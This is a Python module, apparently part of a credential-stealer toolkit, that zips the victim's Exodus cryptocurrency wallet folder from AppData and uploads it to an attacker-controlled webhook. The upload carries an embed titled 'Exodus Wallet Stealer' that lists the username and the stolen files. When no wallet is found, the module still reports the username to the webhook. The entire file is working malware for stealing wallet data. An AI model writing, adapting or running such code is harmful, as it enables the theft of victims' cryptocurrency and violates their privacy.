from libs.libs import *
from lusty import *

class Exodus:
    def __init__(self, webhook):
        self.webhook = webhook

def zip_directory(directory_path, output_zip):
    shutil.make_archive(output_zip, 'zip', directory_path)

def get_files_in_zip(zip_file_path):
    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
        return zip_ref.namelist()

def send_file_to_webhook(file_path, webhook, embed):
    with open(file_path, 'rb') as file:
        files = {'file': (os.path.basename(file_path), file)}
        payload = {
            'embeds': [embed]
        }
        response = requests.post(webhook, files=files, data={'payload_json': json.dumps(payload)})
        
        if response.status_code == 200:
            pass
        else:
            pass

def send_embed_to_webhook(webhook, embed):
    payload = {
        'embeds': [embed]
    }
    response = requests.post(webhook, data={'payload_json': json.dumps(payload)})
    
    if response.status_code == 200:
        pass
    else:
        pass


username = os.getlogin()

directory = os.path.expanduser(rf'C:\Users\{username}\AppData\Roaming\Exodus\exodus.wallet')
output_zip = os.path.expanduser(rf'C:\Users\{username}\AppData\Roaming\Exodus\exodus_wallet_{username}')

if os.path.isdir(directory):
    zip_directory(directory, output_zip)
    
    zip_file_path = f"{output_zip}.zip"
    file_list = get_files_in_zip(zip_file_path)
    
    embed = {
        "title": "Exodus Wallet Stealer",
        "description": f"Exodus wallet from {username}'s computer.",
        "color": 0x000000, 
        "fields": [
            {
                "name": "Username",
                "value": username,
                "inline": False
            },
            {
                "name": "Directory",
                "value": directory,
                "inline": False
            },
            {
                "name": "Files in Zip",
                "value": "\n".join(file_list),
                "inline": False
            }
        ]
    }
    
    send_file_to_webhook(zip_file_path, webhook, embed)
else:
    embed = {
        "title": "Exodus Wallet Not Found",
        "description": f"{username} does not have an Exodus wallet directory.",
        "color": 0x000000, 
        "fields": [
            {
                "name": "Username",
                "value": username,
                "inline": False
            }
        ]
    }
    
    send_embed_to_webhook(webhook, embed)